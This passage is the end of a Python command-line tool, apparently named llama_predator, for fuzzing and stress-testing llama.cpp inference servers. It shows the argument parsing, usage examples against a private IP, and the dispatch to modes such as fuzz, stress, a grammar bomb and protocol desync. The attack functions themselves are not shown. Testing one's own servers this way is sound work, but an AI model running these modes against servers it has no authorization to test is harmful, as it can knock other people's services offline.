  grammar       llama.cpp BNF grammar bomb
  streaming     Protocol desync (truncated/dropped connections)
  shape         Response schema drift detector
  rot           Long-run time-bomb detector (use --rot-min)
  all           Everything except rot

examples:
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode recon
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode all
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode ghost --cycles 500
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode rot --rot-min 60
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode grammar --endpoint /completion
""")
    parser.add_argument("--url",      required=True,   help="Target, e.g. http://10.0.0.42:8080")
    parser.add_argument("--mode",     required=True,
                        choices=["recon","schema","fuzz","stress","ghost","determinism",
                                 "order","grammar","streaming","shape","rot","all"],
                        help="Attack mode")
    parser.add_argument("--endpoint", default=None,    help="Force endpoint path (skips recon)")
    parser.add_argument("--workers",  type=int, default=8,   help="Concurrency workers (default 8)")
    parser.add_argument("--cycles",   type=int, default=300, help="Ghost cycles (default 300)")
    parser.add_argument("--count",    type=int, default=300, help="Fuzz/det iteration count")
    parser.add_argument("--rot-min",  type=int, default=30,  help="Rot test duration in minutes")
    parser.add_argument("--out",      default="llama-predator-out", help="Output directory")
    args = parser.parse_args()

    global BASE_URL, OUT_DIR
    BASE_URL = args.url.rstrip("/")
    OUT_DIR  = args.out

    print(f"\033[1mllama_predator\033[0m → {BASE_URL}")
    print(f"Output: {OUT_DIR}/\n")

    # Resolve endpoint and base_body
    if args.endpoint:
        endpoint  = args.endpoint
        base_body = make_body(endpoint, "2+2=", n_predict=16, temperature=0.0)
    else:
        endpoint, base_body = mode_recon()
        if args.mode == "recon":
            write_report(); return

    if args.mode == "schema":
        endpoint, base_body = mode_schema(endpoint, base_body)
    elif args.mode == "fuzz":
        mode_fuzz(endpoint, base_body, workers=args.workers, count=args.count)
    elif args.mode == "stress":
        mode_stress(endpoint, base_body, workers=args.workers)
    elif args.mode == "ghost":
        mode_ghost(endpoint, base_body, cycles=args.cycles)
    elif args.mode == "determinism":
        mode_determinism(endpoint, base_body, rounds=args.count)
    elif args.mode == "order":
        mode_order(endpoint, base_body)
    elif args.mode == "grammar":
        mode_grammar(endpoint, base_body)
    elif args.mode == "streaming":
        mode_streaming(endpoint, base_body)
    elif args.mode == "shape":
        mode_shape(endpoint, base_body, n=args.count)
    elif args.mode == "rot":
        mode_rot(endpoint, base_body, duration_min=args.rot_min)
    elif args.mode == "all":
        endpoint, base_body = mode_schema(endpoint, base_body)
        mode_all(endpoint, base_body, workers=args.workers, cycles=args.cycles)

    write_report()


if __name__ == "__main__":
    main()
